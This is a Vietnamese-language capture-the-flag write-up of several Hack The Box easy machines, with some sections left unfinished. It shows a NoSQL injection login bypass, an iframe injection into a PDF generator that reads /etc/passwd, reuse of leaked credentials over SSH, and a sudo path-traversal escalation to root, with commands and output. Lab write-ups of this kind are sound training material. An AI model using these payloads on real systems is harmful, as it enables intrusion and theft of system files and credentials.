---
title: "Hackthebox some easy machine"
excerpt: "May 14, 2024 04:00 PM ICT to May 18, 2024 04:00 PM ICT"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/htb.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/htb.jpg" alt="">
</p>

# Hackthebox some easy machine


```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 55
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AVKqxf1CbQcRK0LQcs4q8uXjL8AMGIYSf.hnzIXLK5fbo0Q7ZOe28EjtHvb%2BcXTeTsIpOeYTwHwsE
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{"username": {"$ne": null}, "password": {"$ne": null} }
```

![image](https://hackmd.io/_uploads/S1Il8LxAC.png)

![image](https://hackmd.io/_uploads/H16zD8xAC.png)


Chức năng cơ bản là ta có thể thêm đồ vào giỏ hàng sau đó sẽ order và click vào here ta sẽ thấy có một mẫu kiểu pdf để hiển thị thông tin các sản phẩm và giá -> nghĩ đến lỗi ssrf của file pdf

https://github.com/gotenberg/gotenberg/issues/261


-> sau đó mình thử dùng payload này hiển thị /etc/passwd vào phần title

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Content-Length: 228
Origin: http://dev.stocker.htb
Connection: close
Cookie: connect.sid=s%3AGvaVmAcZg7CngZbFx-15f4bHmrL2J6Ep.ucZMw6OE5hKJbuUCTyvLPFspYHHV%2BNmXq9dplQaU3c4
Priority: u=0

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src='file:///etc/passwd' style=\"width:100%; height:700px;\">","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```


![image](https://hackmd.io/_uploads/Hy6hUWWR0.png)


mở pdf lên ->

![image](https://hackmd.io/_uploads/r1BALbZ00.png)


lưu ý là phải tăng chiều dài và chiều rộng của iframe để có thể xem hết nội dung không nó sẽ bị lấp.


tạm thời để nội dung file /etc/passwd lại đây:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List
Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no
login
systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software
stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nol
ogin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core
Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh
user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/fals
```

Vì chưa biết file index nằm ở đâu nên ta sẽ bỏ dấu Ư của json -> json parser sẽ bị sai và báo lỗi

![image](https://hackmd.io/_uploads/SJ6kAZbRA.png)

-> path là /var/ww/dev/

-> đọc file index.js

![image](https://hackmd.io/_uploads/rkPrCZbC0.png)


```
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString("hex"),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
if (!req.session.user) return res.json([]);
const products = await mongoose.model("Product").find();
return res.json(products);
});
app.get("/login", (req, res) => {
if (req.session.user) return res.redirect("/stock");
return res.sendFile(__dirname + "/templates/login.html");
});
app.post("/login", async (req, res) => {
const { username, password } = req.body;
if (!username || !password) return res.redirect("/login?error=login-error");
// TODO: Implement hashing
const user = await mongoose.model("User").findOne({ username, password });
if (!user) return res.redirect("/login?error=login-error");
req.session.user = user.id;
console.log(req.session);
return res.redirect("/stock");
});
.....
```

ở đây có thể thấy server sử dụng mongodb với username là dev và password là `IHeardPassphrasesArePrettySecure`
để ý trên /etc/password có một người dùng là `angoose:x:1001:1001:,,,:/home/angoose:/bin/bash` khả năng cao là tài khoản ssh

-> ta thử ssh vào:


```
l3mnt2010@ASUSEXPERTBOOK:~$ nmap -sV 10.129.82.121
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-25 11:35 +07
Nmap scan report for dev.stocker.htb (10.129.82.121)
Host is up (0.055s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.95 seconds
l3mnt2010@ASUSEXPERTBOOK:~$ ssh angoose@10.129.82.121
The authenticity of host '10.129.82.121 (10.129.82.121)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ
Warning: Permanently added '10.129.82.121' (ED25519) to the list of known hosts.
angoose@10.129.82.121's password:
angoose@stocker:~$ ls
user.txt
angoose@stocker:~$ whoami
angoose
angoose@stocker:~$ cat user.txt
295e1168a278ba6d26077d4dee50a132
angoose@stocker:~$

```


thành công lấy user flag:

![image](https://hackmd.io/_uploads/rkmQIzZ0R.png)


Tiếp theo sẽ leo quyền lên root:


```
Người dùng angoose có quyền chạy các lệnh cụ thể với quyền sudo.
Cụ thể, người dùng có thể chạy bất kỳ tệp .js nào trong thư mục /usr/local/scripts/ bằng lệnh /usr/bin/node. Điều này nghĩa là angoose có quyền sử dụng sudo để thực thi các script JavaScript với Node.js trong đường dẫn được chỉ định, không cần cung cấp thêm mật khẩu cho mỗi lần thực thi lệnh đó.
```

-> bây giờ thì ta tạo một file js với user này sau đó chạy nó bằng /usr/bin/node

```
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ nano sol.js
angoose@stocker:~$ cat sol.js
const fs = require('fs');
fs.readFile(''/root/root.txt', 'utf8', (err, data) => {
 if (err) throw err;
 console.log(data);
});
angoose@stocker:~$ node sol.js
/home/angoose/sol.js:2
fs.readFile(''/root/root.txt', 'utf8', (err, data) => {
                         ^^^

SyntaxError: missing ) after argument list
    at Object.compileFunction (node:vm:360:18)
    at wrapSafe (node:internal/modules/cjs/loader:1088:15)
    at Module._compile (node:internal/modules/cjs/loader:1123:27)
    at Module._extensions..js (node:internal/modules/cjs/loader:1213:10)
    at Module.load (node:internal/modules/cjs/loader:1037:32)
    at Module._load (node:internal/modules/cjs/loader:878:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
    at node:internal/main/run_main_module:23:47

Node.js v18.12.1
angoose@stocker:~$ rm sol.js
angoose@stocker:~$ nano sol.js
angoose@stocker:~$ node sol.js
/home/angoose/sol.js:3
  if (err) throw err;
           ^

[Error: EACCES: permission denied, open '/root/root.txt'] {
  errno: -13,
  code: 'EACCES',
  syscall: 'open',
  path: '/root/root.txt'
}

Node.js v18.12.1
angoose@stocker:~$ ls
sol.js  user.txt
angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/sol.js
7a511b0d5a0c0a3c6e5f148bb9d18f16

angoose@stocker:~$
```

flag root: `7a511b0d5a0c0a3c6e5f148bb9d18f16`


![image](https://hackmd.io/_uploads/SkqSFMbCA.png)


ngoài ra ta sẽ đi phân tích lại sao lại dính ssrf ở trên:

```
angoose@stocker:/var/www/dev$ cat package
cat: package: No such file or directory
angoose@stocker:/var/www/dev$ cat package.json
{
  "name": "stocker",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev": "nodemon index.js"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "connect-mongo": "^4.6.0",
    "express": "^4.18.2",
    "express-session": "^1.17.3",
    "md5": "^2.3.0",
    "mongoose": "^6.7.5",
    "puppeteer": "^19.3.0"
  },
  "devDependencies": {
    "nodemon": "^2.0.20"
  }
}
```

ở đây có dùng 

```
    browser = await puppeteer.launch({
      headless: true,
      pipe: true,
      args: ["--no-sandbox", "--disable-setuid-sandbox", "--js-flags=--noexpose_wasm,--jitless", "--allow-file-access-from-files"],
      dumpio: true,
    });
```

thêm cả :-1: 

```
const formatHTML = (order) => {
  const poTemplate = fs.readFileSync(__dirname + "/templates/order.html").toString();

  return poTemplate
    .replace(
      "THETABLE",
      `              <table style="width: 100%">
<thead>
  <tr>
    <th scope="col">Item</th>
    <th scope="col">Price (£)</th>
    <th scope="col">Quantity</th>
  </tr>
</thead>
<tbody id="cart-table">
  ${order.items.map(
    (item) => `<tr>
      <th scope="col">${item.title}</th>
      <th scope="col" id="cart-total">${parseFloat(item.price).toFixed(2)}</th>
      <th scope="col">${item.amount}</th>
  </tr>`
  )}
  <tr>
      <td colspan="3"><hr/></td>
  </tr>
  <tr>
    <th scope="col">Total</th>
    <th scope="col" id="cart-total">${order.items
      .map((item) => parseFloat(item.price) * item.amount)
      .reduce((a, b) => a + b, 0)
      .toFixed(2)}</th>
    <th scope="col"></th>
  </tr>
</tbody>
</table>`
    )
    .replace("THEDATE", new Date().toLocaleDateString());
};
```


ở đây có thể thấy nó thực hiện chèn trực tiếp nên có thể inject được mã html và cụ thể là iframe như ta nói ở trên


## Soccer


```
l3mnt2010@ASUSEXPERTBOOK:~$ nmap -sV 10.129.8.232
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-25 12:13 +07
Nmap scan report for 10.129.8.232
Host is up (0.062s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.80%I=7%D=9/25%Time=66F39C0E%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Wed,\x2025\x20Sep\x202024\x2005:13:55\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Wed,\x2025\x20Sep\x202024\x2005:13:55\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Wed,\
SF:x2025\x20Sep\x202024\x2005:13:55\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.95 seconds
l3mnt2010@ASUSEXPERTBOOK:~$
```

ở đây ta có thể thấy có 3 port được mở là 22, 80 và 9091 có vẻ là 1 dịch vụ `xmltec-xmlmail`


### 80/http

Đang chạy service nginx 1.18.0 trên ubuntu

![image](https://hackmd.io/_uploads/HJefpzZR0.png)

Vào thì ta thấy một trang web


```
l3mnt2010@ASUSEXPERTBOOK:~$ dirsearch -u "http://soccer.htb/" -f

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 24987

Output File: /home/l3mnt2010/.dirsearch/reports/soccer.htb/-_24-09-25_12-18-25.txt

Error Log: /home/l3mnt2010/.dirsearch/logs/errors-24-09-25_12-18-25.log

Target: http://soccer.htb/

[12:18:25] Starting:
[12:18:28] 403 -  564B  - /.ht_wsr.txt
[12:18:28] 403 -  564B  - /.htaccess.bak1
[12:18:28] 403 -  564B  - /.htaccess.sample
[12:18:28] 403 -  564B  - /.htpasswd_test
[12:18:29] 403 -  564B  - /.htpasswds
[12:18:29] 403 -  564B  - /.httr-oauth
[12:18:29] 403 -  564B  - /.htaccess_orig
[12:18:29] 403 -  564B  - /.htaccess_sc
[12:18:29] 403 -  564B  - /.html
[12:18:29] 403 -  564B  - /.htm
[12:18:29] 403 -  564B  - /.htaccessOLD
[12:18:29] 403 -  564B  - /.htaccessBAK
[12:18:29] 403 -  564B  - /.htaccess.save
[12:18:29] 403 -  564B  - /.htaccessOLD2
[12:18:29] 403 -  564B  - /.htaccess.orig
[12:18:29] 403 -  564B  - /.htaccess_extra
[12:18:59] 403 -  564B  - /admin/.htaccess
[12:19:11] 403 -  564B  - /administrator/.htaccess
[12:19:16] 403 -  564B  - /app/.htaccess
[12:19:49] 200 -    7KB - /index.html

Task Completed
```

Ta thấy trang chỉ có mỗi trang html này -> khả năng là phải đi tìm sub domain

```
 cat /etc/hosts
127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb

127.0.1.1       ubuntu-focal    ubuntu-focal
```

```
player
PlayerOftheMatch2022
```

```
 ssh player@10.129.9.9
The authenticity of host '10.129.9.9 (10.129.9.9)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE
Warning: Permanently added '10.129.9.9' (ED25519) to the list of known hosts.
player@10.129.9.9's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 25 14:45:13 UTC 2024

  System load:           1.32
  Usage of /:            70.1% of 3.84GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             228
  Users logged in:       1
  IPv4 address for eth0: 10.129.9.9
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c67b

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep 25 14:44:39 2024 from 10.10.14.47
player@soccer:~$ ls
user.txt
player@soccer:~$ cat user.txt
9c4772a0da09d9d8a66cfa83424aee20
player@soccer:~$

```


user flag: `9c4772a0da09d9d8a66cfa83424aee20`


```
player@soccer:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
player@soccer:~$ ls -la /usr/local/bin/doas
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
player@soccer:~$ ls -la /usr/local/bin/doas/
ls: cannot access '/usr/local/bin/doas/': Not a directory
player@soccer:~$ ls -la /usr/local/bin/doas
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
player@soccer:~$ ls -la /usr/local/etc/doas.conf

```



## Precious

```
l3mnt2010@ASUSEXPERTBOOK:~$ nmap -sV 10.129.228.98
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-29 21:48 +07
Nmap scan report for 10.129.228.98
Host is up (0.058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sau đó ta có thể thấy được là chall đang mở 2 port đó là 22 và 80 là 2 service ssh và http đang chạy phiên bản nginx 1.18.0

Vì chưa có thông tin của ssh nên ta sẽ khai thác từ cổng 80 trước -> cơ bản thì cổng này đang host 1 dịch vụ web với ngôn ngữ ruby với nginx server -> chức năng là ta sẽ submit 1 url và trang sẽ convert qua file pdf

Sau khi t

## Editorial

```
l3mnt2010@ASUSEXPERTBOOK:~/HTB/machine/easy$ nmap -A -sV -T4 -vvv 10.129.25.133 -oN nmap.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-18 12:53 +07
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
Initiating Ping Scan at 12:53
Scanning 10.129.25.133 [2 ports]
Completed Ping Scan at 12:53, 0.08s elapsed (1 total hosts)
Initiating Connect Scan at 12:53
Scanning editorial.htb (10.129.25.133) [1000 ports]
Discovered open port 22/tcp on 10.129.25.133
Discovered open port 80/tcp on 10.129.25.133
Increasing send delay for 10.129.25.133 from 0 to 5 due to 17 out of 41 dropped probes since last increase.
Completed Connect Scan at 12:53, 14.12s elapsed (1000 total ports)
Initiating Service scan at 12:53
Scanning 2 services on editorial.htb (10.129.25.133)
Completed Service scan at 12:53, 6.31s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.25.133.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 4.62s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.69s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
Nmap scan report for editorial.htb (10.129.25.133)
Host is up, received syn-ack (0.16s latency).
Scanned at 2024-07-18 12:53:27 +07 for 26s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.71 seconds
l3mnt2010@ASUSEXPERTBOOK:~/HTB/machine/easy$
```



```
l3mnt2010@ASUSEXPERTBOOK:~$ ssh dev@10.129.25.133
dev@10.129.25.133's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jul 18 06:41:37 AM UTC 2024

  System load:           0.08
  Usage of /:            60.5% of 6.35GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.25.133
  IPv6 address for eth0: dead:beef::250:56ff:feb9:8ccb


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cat user.txt
64c89c804232a31a3b175d789e414b38
dev@editorial:~$
```


user.txt 

flag user: `64c89c804232a31a3b175d789e414b38`
